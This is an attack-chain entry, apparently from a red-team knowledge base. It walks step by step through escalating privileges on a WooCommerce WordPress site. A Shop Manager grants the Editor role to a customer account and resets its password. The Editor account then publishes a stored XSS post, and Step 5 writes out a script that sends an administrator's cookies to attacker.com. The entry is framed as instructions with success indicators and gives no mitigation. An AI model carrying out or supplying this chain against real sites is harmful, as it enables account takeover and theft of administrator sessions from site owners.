---
tags:
  - woocommerce
  - wordpress
  - privilege-escalation
  - stored-xss
  - role-assignment
  - authorization-bypass
type: attack_chain
tools: []
tactics:
  - '[[Privilege Escalation]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/WooCommerce-Login-as-Shop-Manager]]'
  - '[[procedures/Assign-Editor-Role-to-Low-Privilege-User]]'
  - '[[procedures/Change-Password-of-Elevated-User]]'
  - '[[procedures/Login-as-Editor-User]]'
  - '[[procedures/Create-Stored-XSS-Post-for-Admin-Escalation]]'
step_count: 5
techniques:
  - '[[Account Manipulation]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:29:44.838Z'
description: >-
  Multi-stage privilege escalation in WooCommerce exploiting blacklist-based
  role restrictions to assign Editor roles and execute Stored XSS for Admin
  access.
skill_level: intermediate
impact_level: high
id: c10d8022-d4e2-40c4-941c-afea276ae655
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Account Manipulation]]'
  - '[[JavaScript]]'
---
# WooCommerce Shop Manager Privilege Escalation via Role Assignment and Stored XSS

Multi-stage attack chain demonstrating a complete privilege escalation workflow in WooCommerce-enabled WordPress sites, leveraging insufficient role restrictions and Stored XSS capabilities.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Login as Shop Manager] --> B[Assign Editor Role]
    B --> C[Change User Password]
    C --> D[Login as Editor]
    D --> E[Create Stored XSS Post]
    E --> F[Escalate to Admin]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#9b59b6
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Chrome with developer tools for payload testing)

### Target Environment

- WordPress with WooCommerce plugin installed
- Admin access required for Shop Manager role
- PHP-based web platform

### Initial Access Requirements

- Valid Shop Manager credentials
- Network access to the WordPress admin dashboard (typically /wp-admin/)
- No prior Admin access needed, but low-privilege user account (e.g., customer) must exist

## Detailed Attack Procedures

### Step 1: Login as Shop Manager
procedure: [[procedures/WooCommerce-Login-as-Shop-Manager]]

**Objective**: Gain access to the WordPress admin dashboard with Shop Manager privileges to initiate role manipulation.

**Instructions**: Open a web browser and navigate to the WordPress login page (e.g., https://target.com/wp-admin/). Enter the Shop Manager username and password to authenticate.

**Expected Output**: Successful login redirecting to the WordPress admin dashboard, with menu options limited to WooCommerce and user management sections.

**Success Indicators**:
- Dashboard loads with Shop Manager role visible in user profile
- Access to Users > All Users section granted

### Step 2: Assign Editor Role to Low-Privilege User
procedure: [[procedures/Assign-Editor-Role-to-Low-Privilege-User]]

**Objective**: Exploit the blacklist restriction in WooCommerce's map_meta_cap to elevate a low-privilege user (e.g., customer) to Editor role, bypassing Admin-only protections.

**Instructions**: In the admin dashboard, navigate to Users > All Users. Select a low-privilege user (e.g., a customer account). Click Edit, then in the Role dropdown, select 'Editor' and save changes. This succeeds because WooCommerce only blacklists Admin role assignments, not Editor.

**Expected Output**: User role updated to Editor in the database (verifiable via user edit page or direct DB query if accessible).

**Success Indicators**:
- Role change confirmation message
- Elevated user now has Editor capabilities like unfiltered_html

### Step 3: Change Password of Elevated User
procedure: [[procedures/Change-Password-of-Elevated-User]]

**Objective**: Secure control over the newly elevated Editor account by updating its password.

**Instructions**: While still editing the user from Step 2, locate the 'Account Management' section in the user edit form. Enter a new strong password in the password fields and click Update User.

**Expected Output**: Password updated successfully, with a confirmation message; the user can now log in with the new credentials.

**Success Indicators**:
- No errors on save
- Ability to log in with new password (test in Step 4)

### Step 4: Login as Editor User
procedure: [[procedures/Login-as-Editor-User]]

**Objective**: Access the site with Editor privileges to prepare for XSS exploitation.

**Instructions**: Log out of the Shop Manager session if needed, then log in using the elevated user's credentials (username and new password) at the WordPress login page.

**Expected Output**: Dashboard loads with Editor role permissions, including access to Posts > Add New.

**Success Indicators**:
- Editor-specific menu items visible (e.g., full Posts access)
- unfiltered_html capability active for post content

### Step 5: Create Stored XSS Post for Admin Escalation
procedure: [[procedures/Create-Stored-XSS-Post-for-Admin-Escalation]]

**Objective**: Leverage Editor's unfiltered_html capability to inject JavaScript payload, enabling Stored XSS that escalates privileges when an Admin views the post (e.g., via cookie theft or form submission).

**Instructions**: In the dashboard, go to Posts > Add New. In the post content editor (Classic or Gutenberg), switch to Text/HTML mode if needed, and insert a JavaScript payload such as `<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>`. Publish the post. Notify or wait for an Admin to view it, triggering the XSS to exfiltrate session data or perform privilege-escalating actions.

**Expected Output**: Post published and visible in Posts list; when Admin views, payload executes (monitor attacker server for stolen data).

**Success Indicators**:
- Post saves without sanitization errors
- JavaScript executes on Admin view, leading to credential theft or role change

## Attack Chain Summary

### Key Achievements

1. Bypassed WooCommerce role restrictions to elevate arbitrary users to Editor
2. Gained Editor access for unfiltered content injection
3. Executed Stored XSS to achieve full Admin privilege escalation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Account Manipulation]] Account Manipulation
- [[JavaScript]] JavaScript

### MITRE ATT&CK Tactics

- [[Privilege Escalation]] Privilege Escalation

---
*Last updated: 2023-10-01T00:00:00Z*
